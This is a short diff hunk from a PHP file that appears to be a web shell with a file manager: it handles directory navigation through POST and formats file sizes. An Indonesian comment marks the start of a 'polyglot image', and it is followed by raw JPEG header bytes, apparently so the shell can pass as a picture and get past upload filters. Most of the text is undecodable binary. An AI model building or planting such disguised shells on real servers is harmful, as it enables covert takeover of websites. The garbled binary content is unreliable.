@@ -206,4 +206,5 @@ if(isset($_POST['godir'])){
 function formatBytes($s,$p=1){$b=log($s,1024);$x=['B','KB','MB','GB','TB'];return round(pow(1024,$b-floor($b)),$p).' '.$x[(int)floor($b)];}
 ?>
 <!-- GAMBAR POLYGLOT MULAI -->
+
 ÿØÿàJFIF``ÿÛC$3br%&<'ÿÀ00"ÿÄÿÄµ}![1AQa"q2‘¡#B±Á $'3–R‚Ñð%brÿÚ 8!1AQa"q2‘¡#B±Á RÑð$3br‚%&'()*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyzƒ„…†‡ˆ‰Š’“”•–—˜™š¢£¤¥¦§¨©ª²³´µ¶·¸¹ºÂÃÄÅÆÇÈÉÊÒÓÔÕÖ×ØÙÚÿÄÿÄµw!1AQaq"2‘¡±B#ÁRÑð3br$4á%ñ'&<()*56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz‚ƒ„…†‡ˆ‰Š’“”•–—˜™š¢£¤¥¦§¨©ª²³´µ¶·¸¹ºÂÃÄÅÆÇÈÉÊÒÓÔÕÖ×ØÙÚÿÄÿÄµ}!1AQaq2‘¡#B±Á RÑð$3br‚%&'()*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyzƒ„…†‡ˆ‰Š’“”•–—˜™š¢£¤¥¦§¨©ª²³´µ¶·¸¹ºÂÃÄÅÆÇÈÉÊÒÓÔÕÖ×ØÙÚÿÚ?÷ú
